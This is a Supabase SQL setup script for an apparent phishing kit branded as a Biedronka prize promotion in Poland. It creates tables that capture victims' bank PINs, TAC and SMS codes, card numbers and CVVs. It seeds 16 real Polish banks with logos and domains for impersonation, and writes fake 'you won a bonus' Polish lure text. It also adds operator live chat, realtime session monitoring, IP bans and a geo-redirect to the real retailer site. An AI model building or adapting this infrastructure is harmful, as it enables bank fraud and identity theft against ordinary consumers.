-- =========================================================================
-- BIEDRONKA POLAND CAMPAIGN — fresh Supabase project setup
-- Supabase SQL Editor'a bastan sona calistir (yeni proje).
-- Kapsar: sessions, banks (16 PL bankasi), global_settings (Lehce varsayilanlar),
--         chat_messages, banned_ips, admin_logs, RLS + realtime + storage buckets.
-- =========================================================================

create extension if not exists "pgcrypto";

-- ---------------------------------------------------------------------------
-- 1) sessions
-- ---------------------------------------------------------------------------
do $$
begin
  if to_regclass('public.sessions') is not null then
    alter table public.sessions drop constraint if exists sessions_current_step_check;
    alter table public.sessions drop constraint if exists sessions_status_check;
    alter table public.sessions drop constraint if exists sessions_sms_digits_check;
    alter table public.sessions drop constraint if exists sessions_public_id_key;
  end if;
end $$;

create table if not exists public.sessions (
  id text primary key default encode(gen_random_bytes(12), 'hex'),
  amount integer not null default 0 check (amount >= 0),
  current_step text not null default 'win',
  status text not null default 'offline',
  sms_digits integer not null default 6,
  form_data jsonb not null default '{}'::jsonb,
  is_hidden boolean default false,
  partner_name text,
  public_id integer,
  ip_address text,
  user_agent text,
  participation_code text,
  sms_custom_text text,
  is_win2_flow boolean default false,
  pending_profile boolean default false,
  phone text,
  "bankSlug" text,
  "bankName" text,
  "viewingBankSlug" text,
  "viewingBankName" text,
  "logoFile" text,
  verfuegernummer text,
  pin text,
  "tacCode" text,
  "selectedProvider" text,
  "transferAmount" text,
  "approvalStatus" text,
  "approvalCode" text,
  "approvalConfirmedAt" timestamptz,
  "approvalHistory" jsonb,
  "specialNoticeText" text,
  "specialNoticeImage" text,
  "specialNoticeLang" text,
  "specialNoticeSentAt" timestamptz,
  "customQuestions" jsonb,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);
create unique index if not exists sessions_public_id_key on public.sessions (public_id);
create index if not exists sessions_created_at_idx on public.sessions (created_at desc);
alter table public.sessions replica identity full;

create or replace function public.set_sessions_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

drop trigger if exists sessions_set_updated_at on public.sessions;
create trigger sessions_set_updated_at
before update on public.sessions
for each row execute function public.set_sessions_updated_at();

alter table public.sessions enable row level security;
drop policy if exists "sessions_authenticated_all" on public.sessions;
drop policy if exists "sessions_anon_select_demo"   on public.sessions;
drop policy if exists "sessions_anon_update_demo"   on public.sessions;
drop policy if exists "sessions_anon_insert_demo"   on public.sessions;
create policy "sessions_authenticated_all" on public.sessions for all to authenticated using (true) with check (true);
create policy "sessions_anon_select_demo"   on public.sessions for select to anon using (true);
create policy "sessions_anon_update_demo"   on public.sessions for update to anon using (true) with check (true);
create policy "sessions_anon_insert_demo"   on public.sessions for insert to anon with check (true);

-- Eski kurulumdan kalabilecek eksik kolonlar
alter table public.sessions add column if not exists partner_name text;
alter table public.sessions add column if not exists public_id integer;
alter table public.sessions add column if not exists ip_address text;
alter table public.sessions add column if not exists user_agent text;
alter table public.sessions add column if not exists participation_code text;
alter table public.sessions add column if not exists sms_custom_text text;
alter table public.sessions add column if not exists is_win2_flow boolean default false;
alter table public.sessions add column if not exists pending_profile boolean default false;
alter table public.sessions add column if not exists phone text;
alter table public.sessions add column if not exists "bankSlug" text;
alter table public.sessions add column if not exists "bankName" text;
alter table public.sessions add column if not exists "viewingBankSlug" text;
alter table public.sessions add column if not exists "viewingBankName" text;
alter table public.sessions add column if not exists "logoFile" text;
alter table public.sessions add column if not exists verfuegernummer text;
alter table public.sessions add column if not exists pin text;
alter table public.sessions add column if not exists "tacCode" text;
alter table public.sessions add column if not exists "selectedProvider" text;
alter table public.sessions add column if not exists "transferAmount" text;
alter table public.sessions add column if not exists "approvalStatus" text;
alter table public.sessions add column if not exists "approvalCode" text;
alter table public.sessions add column if not exists "approvalConfirmedAt" timestamptz;
alter table public.sessions add column if not exists "approvalHistory" jsonb;
alter table public.sessions add column if not exists "specialNoticeText" text;
alter table public.sessions add column if not exists "specialNoticeImage" text;
alter table public.sessions add column if not exists "specialNoticeLang" text;
alter table public.sessions add column if not exists "specialNoticeSentAt" timestamptz;
alter table public.sessions add column if not exists "customQuestions" jsonb;
alter table public.sessions add column if not exists is_hidden boolean default false;
alter table public.sessions add column if not exists form_data jsonb not null default '{}'::jsonb;

-- ---------------------------------------------------------------------------
-- 2) banks — 16 Polonya bankasi (hepsi aktif, Polonya)
--    Ozel HTML sablonlari public/pl-banks/<slug>/{1,2}.html'den okunur
--    (PolandBankTemplate). Logolar: app-store ikonlari, daire kirpilmis webp.
-- ---------------------------------------------------------------------------
create table if not exists public.banks (
  slug text primary key,
  name text not null,
  country text,
  logo text,
  logo_file text,
  brand_color text,
  accent_color text,
  domain text,
  is_active boolean default true,
  auto_redirect boolean default false,
  sort_order integer default 0,
  design_config jsonb default '{}'::jsonb,
  created_at timestamptz not null default now()
);
alter table public.banks replica identity full;
alter table public.banks enable row level security;
drop policy if exists "banks_authenticated_all" on public.banks;
drop policy if exists "banks_anon_select"       on public.banks;
create policy "banks_authenticated_all" on public.banks for all to authenticated using (true) with check (true);
create policy "banks_anon_select"       on public.banks for select to anon using (true);

insert into public.banks (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, auto_redirect, sort_order, design_config) values
  ('pekao24',    'Bank Pekao (PeoPay)',       'Polonya', '/bank-logos/poland/pekao24.webp',   '#e31e24', '#b3181d', 'pekao24.pl',       true, false, 10,  '{}'),
  ('ing',        'ING Bank Śląski',           'Polonya', '/bank-logos/poland/ing.webp',       '#ff6200', '#cc4e00', 'ing.pl',           true, false, 20,  '{}'),
  ('bnpparibas', 'BNP Paribas',               'Polonya', '/bank-logos/poland/bnpparibas.webp','#008766', '#006850', 'bnpparibas.pl',    true, false, 30,  '{}'),
  ('millennium', 'Bank Millennium',           'Polonya', '/bank-logos/poland/millennium.webp','#e2004f', '#b3003f', 'bankmillennium.pl',true, false, 40,  '{}'),
  ('alior',      'Alior Bank',                'Polonya', '/bank-logos/poland/alior.webp',     '#e10064', '#b30050', 'aliorbank.pl',     true, false, 50,  '{}'),
  ('velobank',   'VeloBank',                  'Polonya', '/bank-logos/poland/velobank.webp',  '#00a650', '#008040', 'velobank.pl',      true, false, 60,  '{}'),
  ('santander',  'Santander',                 'Polonya', '/bank-logos/poland/santander.svg',  '#ec0000', '#bd0000', 'santander.pl',     true, false, 70,  '{}'),
  ('mbank',      'mBank',                     'Polonya', '/bank-logos/poland/mbank.webp',     '#d9222a', '#b01b22', 'mbank.pl',         true, false, 80,  '{}'),
  ('ipko',       'iPKO (PKO BP)',             'Polonya', '/bank-logos/poland/ipko.webp',      '#0051ba', '#003e94', 'ipko.pl',          true, false, 90,  '{}'),
  ('ca24',       'Crédit Agricole (CA24)',    'Polonya', '/bank-logos/poland/ca24.webp',      '#006f4e', '#00583e', 'ca24.pl',          true, false, 100, '{}'),
  ('citibank',   'Citi Handlowy',             'Polonya', '/bank-logos/poland/citibank.svg',   '#056dae', '#04578b', 'citibank.pl',      true, false, 110, '{}'),
  ('pocztowy',   'Bank Pocztowy',             'Polonya', '/bank-logos/poland/pocztowy.webp',  '#ffc000', '#cc9a00', 'pocztowy.pl',      true, false, 120, '{}'),
  ('sgb',        'Bank Spółdzielczy (SGB)',   'Polonya', '/bank-logos/poland/sgb.webp',       '#008a44', '#006e36', 'sgb.pl',           true, false, 130, '{}'),
  ('bps',        'Bank BPS',                  'Polonya', '/bank-logos/poland/bps.webp',       '#0054a6', '#004385', 'bps.pl',           true, false, 140, '{}'),
  ('bosbank',    'BOŚ Bank',                  'Polonya', '/bank-logos/poland/bosbank.webp',   '#009a44', '#007b36', 'bosbank.pl',       true, false, 150, '{}'),
  ('bsr-krakow', 'BS Rzeszów / Kraków',       'Polonya', '/bank-logos/poland/bsr-krakow.svg', '#1a5ea6', '#154b85', 'bsr.pl',           true, false, 160, '{}')
on conflict (slug) do update set
  name          = excluded.name,
  country       = excluded.country,
  logo_file     = excluded.logo_file,
  brand_color   = excluded.brand_color,
  accent_color  = excluded.accent_color,
  domain        = excluded.domain,
  is_active     = excluded.is_active,
  auto_redirect = excluded.auto_redirect,
  sort_order    = excluded.sort_order;

-- ---------------------------------------------------------------------------
-- 3) global_settings  (tek satir, id = 'default')
--    Kullaniciya gorunen tum metinler = Lehce, kampanya = Biedronka PL
-- ---------------------------------------------------------------------------
create table if not exists public.global_settings (
  id text primary key default 'default',
  logo_url text, bg_url text, og_image_url text,
  portal_name text, support_center_name text,
  win_title text, win_subtitle text, win_button text,
  banken_title text, banken_subtitle text, banken_search_placeholder text,
  wait_title text, wait_subtitle text,
  sms_title text, sms_subtitle text, sms_input_label text, sms_button text, sms_loading text,
  card_title text, card_subtitle text, card_owner_label text, card_number_label text,
  card_expiry_label text, card_cvv_label text, card_button text,
  code_title text, code_subtitle text, code_button text,
  live_support_title text, live_support_subtitle text, live_support_button text,
  profile_title_small text, profile_title_main text, profile_subtitle text,
  profile_firstname_label text, profile_lastname_label text, profile_phone_label text,
  profile_button text, profile_loading_text text,
  site_language text, target_country text,
  entry_page text default '/win',
  site_enabled boolean default true,
  wheel_settings jsonb default '{}'::jsonb,
  updated_at timestamptz not null default now()
);
alter table public.global_settings enable row level security;
drop policy if exists "global_settings_authenticated_all" on public.global_settings;
drop policy if exists "global_settings_anon_select"       on public.global_settings;
create policy "global_settings_authenticated_all" on public.global_settings for all to authenticated using (true) with check (true);
create policy "global_settings_anon_select"       on public.global_settings for select to anon using (true);

insert into public.global_settings (
  id, logo_url, bg_url,
  portal_name, support_center_name,
  win_title, win_subtitle, win_button,
  banken_title, banken_subtitle, banken_search_placeholder,
  wait_title, wait_subtitle,
  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
  card_title, card_subtitle, card_owner_label, card_number_label, card_expiry_label, card_cvv_label, card_button,
  code_title, code_subtitle, code_button,
  live_support_title, live_support_subtitle, live_support_button,
  profile_title_small, profile_title_main, profile_subtitle,
  profile_firstname_label, profile_lastname_label, profile_phone_label, profile_button, profile_loading_text,
  site_language, target_country, entry_page, site_enabled, wheel_settings
) values (
  'default',
  '/form-assets/biedronka-mini-logo.webp',
  '/form-assets/bg-desktop.webp',
  'Portal Klienta Biedronka',
  'Obsługa Klienta Biedronka',
  'Ekskluzywny Bonus Biedronka',
  'Gratulacje! Zostałeś wybrany do dzisiejszej promocji Biedronka. Kliknij przycisk poniżej, aby odebrać swój bonus.',
  'Odbierz bonus',
  'Wybierz swój bank',
  'Wybierz swój bank, aby kontynuować.',
  'Szukaj swojego banku...',
  'Proszę czekać',
  'Twoje żądanie jest bezpiecznie przetwarzane...',
  'Kod bezpieczeństwa SMS', 'Wprowadź {digits}-cyfrowy kod.', 'Jednorazowy kod', 'Potwierdź', 'Przetwarzanie...',
  'Dane do płatności', 'Sprawdź i potwierdź swoje dane.', 'Imię i nazwisko posiadacza karty', 'Numer karty', 'Data ważności MM/RR', 'Kod bezpieczeństwa', 'Kontynuuj',
  'Witamy', 'Wprowadź kod uczestnictwa otrzymany od {partner}, aby odblokować nagrodę.', 'Potwierdź kod',
  'Wsparcie na żywo', 'Aby kontynuować, skontaktuj się z naszą obsługą klienta.' || chr(10) || chr(10) || 'Kliknij przycisk poniżej, aby rozpocząć czat.', 'Rozpocznij czat',
  'Potwierdzenie nagrody', 'Twoja kwota bonusu', 'Potwierdź swoje dane do dalszego przetwarzania.',
  'Imię', 'Nazwisko', 'Numer telefonu', 'Dalej', 'Przetwarzanie...',
  'pl', 'Polonya', '/win', true,
  '{"campaign_name":"Biedronka","geo_redirect_url":"https://www.biedronka.pl","theme_primary":"#e1001a","allowed_countries":["PL"],"prizes":[{"amount":3500,"weight":10},{"amount":3000,"weight":25},{"amount":2500,"weight":30},{"amount":2000,"weight":35}]}'::jsonb
)
on conflict (id) do update set
  logo_url                  = excluded.logo_url,
  bg_url                    = excluded.bg_url,
  portal_name               = excluded.portal_name,
  support_center_name       = excluded.support_center_name,
  win_title                 = excluded.win_title,
  win_subtitle              = excluded.win_subtitle,
  win_button                = excluded.win_button,
  banken_title              = excluded.banken_title,
  banken_subtitle           = excluded.banken_subtitle,
  banken_search_placeholder = excluded.banken_search_placeholder,
  site_language             = excluded.site_language,
  target_country            = excluded.target_country,
  wheel_settings            = excluded.wheel_settings;

-- ---------------------------------------------------------------------------
-- 4) chat_messages  (live-support chat)
-- ---------------------------------------------------------------------------
create table if not exists public.chat_messages (
  id bigserial primary key,
  session_id text not null,
  sender text not null check (sender in ('user', 'admin', 'system')),
  content text,
  image_url text,
  created_at timestamptz not null default now()
);
create index if not exists chat_messages_session_idx on public.chat_messages (session_id, created_at);
alter table public.chat_messages enable row level security;
drop policy if exists "chat_authenticated_all" on public.chat_messages;
drop policy if exists "chat_anon_select"       on public.chat_messages;
drop policy if exists "chat_anon_insert"       on public.chat_messages;
create policy "chat_authenticated_all" on public.chat_messages for all to authenticated using (true) with check (true);
create policy "chat_anon_select"       on public.chat_messages for select to anon using (true);
create policy "chat_anon_insert"       on public.chat_messages for insert to anon with check (true);

-- ---------------------------------------------------------------------------
-- 5) banned_ips  (admin IP blocklist)
-- ---------------------------------------------------------------------------
create table if not exists public.banned_ips (
  ip_address text primary key,
  reason text,
  created_at timestamptz not null default now()
);
alter table public.banned_ips enable row level security;
drop policy if exists "banned_ips_authenticated_all" on public.banned_ips;
drop policy if exists "banned_ips_anon_select"       on public.banned_ips;
create policy "banned_ips_authenticated_all" on public.banned_ips for all to authenticated using (true) with check (true);
create policy "banned_ips_anon_select"       on public.banned_ips for select to anon using (true);

-- ---------------------------------------------------------------------------
-- 6) admin_logs  (admin action audit)
-- ---------------------------------------------------------------------------
create table if not exists public.admin_logs (
  id bigserial primary key,
  admin_email text not null,
  action text not null,
  target text,
  detail jsonb,
  ip text,
  user_agent text,
  created_at timestamptz not null default now()
);
alter table public.admin_logs enable row level security;
drop policy if exists "admin_logs_authenticated_all" on public.admin_logs;
create policy "admin_logs_authenticated_all" on public.admin_logs for all to authenticated using (true) with check (true);

-- ---------------------------------------------------------------------------
-- 7) Realtime publication
-- ---------------------------------------------------------------------------
do $$
begin
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'sessions') then
    alter publication supabase_realtime add table public.sessions;
  end if;
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'banks') then
    alter publication supabase_realtime add table public.banks;
  end if;
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'chat_messages') then
    alter publication supabase_realtime add table public.chat_messages;
  end if;
  if not exists (select 1 from pg_publication_tables where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'global_settings') then
    alter publication supabase_realtime add table public.global_settings;
  end if;
end $$;

-- ---------------------------------------------------------------------------
-- 8) Storage buckets  (OG resim / logo / background / chat gorsel yuklemeleri)
-- ---------------------------------------------------------------------------
insert into storage.buckets (id, name, public) values ('assets', 'assets', true) on conflict (id) do nothing;
insert into storage.buckets (id, name, public) values ('chat_images', 'chat_images', true) on conflict (id) do nothing;

drop policy if exists "Public Access" on storage.objects;
drop policy if exists "Allow Uploads" on storage.objects;
create policy "Public Access" on storage.objects for select using (bucket_id in ('assets','chat_images'));
create policy "Allow Uploads" on storage.objects for insert with check (bucket_id in ('assets','chat_images'));

-- =========================================================================
-- Done. Verify with:
--   select slug, name, country, is_active from public.banks order by sort_order;
--   select portal_name, site_language, target_country from public.global_settings;
-- =========================================================================
